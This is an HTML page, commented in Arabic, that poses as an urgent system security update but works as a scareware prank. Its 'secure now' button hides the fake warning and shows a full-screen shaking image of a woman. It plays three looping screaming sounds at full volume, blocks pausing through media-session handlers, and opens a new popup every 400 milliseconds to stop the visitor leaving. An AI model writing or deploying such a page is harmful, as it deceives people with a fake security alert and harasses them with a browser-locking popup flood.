<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Update</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; }
        
        /* الواجهة البيضاء الرسمية سواسوة */
        #ui { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; transition: 0.3s; }
        .warning-box { text-align: center; padding: 20px; }
        .warning-icon { font-size: 50px; color: #f44336; margin-bottom: 10px; }
        h2 { color: #333; margin-bottom: 10px; }
        p { color: #666; font-size: 14px; margin-bottom: 30px; }
        .btn-elegant { background: #007bff; color: #fff; border: none; padding: 15px 40px; border-radius: 25px; font-size: 18px; font-weight: 500; cursor: pointer; box-shadow: 0 4px 15px rgba(0,123,255,0.3); transition: 0.3s; }
        .btn-elegant:active { transform: scale(0.95); background: #0056b3; }

        /* صورة المرأة: رعشة ثابتة ومقلقة سواسوة */
        #madImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 999; display: none; }
        
        @keyframes steadyJitter {
            0% { transform: translate(2px, 1px) rotate(0deg); }
            20% { transform: translate(-3px, -2px) rotate(-0.5deg); }
            40% { transform: translate(-3px, 2px) rotate(0.5deg); }
            60% { transform: translate(3px, 2px) rotate(-0.5deg); }
            80% { transform: translate(-2px, -1px) rotate(0.5deg); }
            100% { transform: translate(2px, 1px) rotate(0deg); }
        }
        .vibrate-steady { display: block !important; animation: steadyJitter 0.04s infinite; }
    </style>
</head>
<body>

    <div id="ui">
        <div class="warning-box">
            <div class="warning-icon">⚠️</div>
            <h2>تحديث أمني مطلوب</h2>
            <p>تم اكتشاف نشاط مشبوه على جهازك. يرجى الضغط على الزر أدناه لتأمين بياناتك فوراً.</p>
            <button class="btn-elegant" onclick="launchChaos()">تأمين الآن</button>
        </div>
    </div>

    <img id="madImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">

    <script>
        function launchChaos() {
            // 1. اختفاء الواجهة وظهور المرأة سواسوة
            document.getElementById('ui').style.display = 'none';
            document.getElementById('madImg').classList.add('vibrate-steady');

            // 2. الأصوات الـ 3 المريغلة سواسوة
            const audios = [
                "https://www.myinstants.com/media/sounds/hoova-2.mp3",
                "https://www.myinstants.com/media/sounds/chicken-on-tree-screaming.mp3",
                "https://www.myinstants.com/media/sounds/dzonza.mp3"
            ];

            audios.forEach(src => {
                let a = new Audio(src);
                a.loop = true;
                a.volume = 1.0;
                a.play();
                
                // ميزة الصوت المستمر سواسوة (يلسق في الـ Background)
                if ('mediaSession' in navigator) {
                    navigator.mediaSession.metadata = new MediaMetadata({ title: 'System Security', artist: 'Protected' });
                    navigator.mediaSession.setActionHandler('play', () => a.play());
                    navigator.mediaSession.setActionHandler('pause', () => a.play()); // ممنوع التوقف سواسوة
                }
            });

            // 3. منع الخروج سواسوة
            setInterval(() => { window.open(window.location.href, '_blank', 'width=10,height=10'); }, 400);
        }
    </script>
</body>
</html>
